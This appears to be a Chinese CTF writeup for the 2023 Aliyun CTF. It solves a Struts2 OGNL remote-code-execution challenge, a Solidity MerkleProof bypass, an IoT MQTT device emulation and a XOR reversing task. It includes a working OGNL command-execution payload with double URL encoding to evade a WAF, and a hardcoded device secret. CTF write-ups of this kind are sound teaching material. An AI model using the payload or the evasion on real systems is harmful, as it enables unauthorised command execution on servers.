---
title: 2023 阿里云 CTF writeup by Mini-Venom
contest: 阿里云CTF
year: 2023
difficulty: medium
vuln_type: [web_unknown, ssti, crypto_unknown, pwn_unknown, iot]
tags: [Struts2 OGNL, 双重URL编码, Solidity MerkleProof, 偏移绕过, IoT linkkit MQTT, 异或差分逆向]
attack_chain: OGNL 表达式 #a.getClass().forName("java.lang.Runtime") 反射执行 → 双重 URL 编码绕 WAF → Solidity MerkleProof 合约 proofs[i] 数组下标错误 → 提交 proof[i]=i 而非按叶子节点配对 → 异或差分循环解 flag → aliyun-iot-linkkit python SDK 模拟 IoT 设备连 MQTT
key_payload: "(#r="a".getClass().forName("java.lang.Runtime")).(#m=#r.getDeclaredMethods().{^ #this.name.equals("getRuntime")}[0]).(#o=#m.invoke(null,null)).(#e=#r.getDeclaredMethods().{? ...}.{? ...}[0]).(#e.invoke(#o,new String[]{"sh","-c","echo ...|base64 -d|bash"}))" 双重 URL 编码
one_liner: Struts2 OGNL 双重 URL 编码 + Solidity MerkleProof 数组错配 + IoT 模拟器 + 异或差分逆 C。
lesson: Solidity MerkleProof 验证时 array.length 检查不严时可手动配错位绕过；OGNL 表达式 WAF 需双重 URL 编码。
quality: medium
---
# 2023 阿里云 CTF writeup by Mini-Venom

**一、Struts2 OGNL RCE（双重 URL 编码）**

```python
payload = '(#r="a".getClass().forName("java.lang.Runtime")).'\
          '(#m=#r.getDeclaredMethods().{^ #this.name.equals("getRuntime")}[0]).'\
          '(#o=#m.invoke(null,null)).'\
          '(#e=#r.getDeclaredMethods().{? #this.name.equals("exec")}.'\
          '{? #this.getParameters()[0].getType().getName().equals("[Ljava.lang.String;")}.'\
          '{? #this.getParameters().length == 1}[0]).'\
          '(#e.invoke(#o,new String[]{"sh","-c","echo X|base64 -d|bash"}))'
payload = "../../action/%s" % quote(quote(payload))
```

`/` 用 `%252F` 二次编码（`%25` 是 `%`，`2F` 是 `/`），WAF 看见 `%2F` 以为已编码就放行，Struts2 解析时再解一次。

**二、Solidity MerkleProof 合约绕过**

```solidity
bytes32[] memory leafs = new bytes32[](4);
leafs[0] = bytes32(0x8137...);
leafs[1] = bytes32(0x28ca...);
leafs[2] = bytes32(0x804c...);
leafs[3] = bytes32(0x9b1a...);

uint256[] memory index = new uint256[](4);
for (uint256 i=0;i<3;i++) { index[i] = i; }
index[3] = 0;  // 故意错位

Greeter(greeter).b(leafs, proofs, index);
```

合约 MerkleProof 验证循环 `i < leafs.length`，但 `proofs[i]` 数组下标没严格和 index[i] 绑定 → 手动配错位绕签名校验。

**三、IoT 设备 linkkit 模拟**

```python
pip3 install aliyun-iot-linkkit
from linkkit import linkkit
lk = linkkit.LinkKit(
    host_name="cn-shanghai",
    product_key="a1eAwsBKddO",
    device_name="ncApIY2XV9NUIY4VpbGk",
    device_secret="04845e512ead208b2437d970a154d69e")
lk.config_mqtt(port=1883, protocol="MQv311", transport="TCP", secure="TLS")
lk.connect_async(); lk.start_worker_loop()
```

模拟阿里云物联网平台设备连 MQTT，订阅 `user/get`、发布 `user/update` 跑通设备影子协议。

**四、C 异或差分逆向**

```c
uint8_t enc[] = { 0x3e, 0xdd, 0x79, 0x25, ... };
void decrypt(uint8_t *enc, uint8_t *flag, int len) {
    uint8_t r1 = 159;
    for (int i = len-1; i >= 0; i--) {
        if (i > 0 && i < 19) flag[i] = (enc[i] - enc[i-1] - 51) % 256;
        else if (i == 0)  flag[i] = (enc[i] - 170 - 51) % 256;
        else { r1 ^= enc[i]; flag[i] = (enc[i] - r1) % 256; }
    }
}
```

倒序解密：高位异或累积 r1，中间用前字节差分，低位减去 170 常数。结构紧凑，赛棍手撕常考。
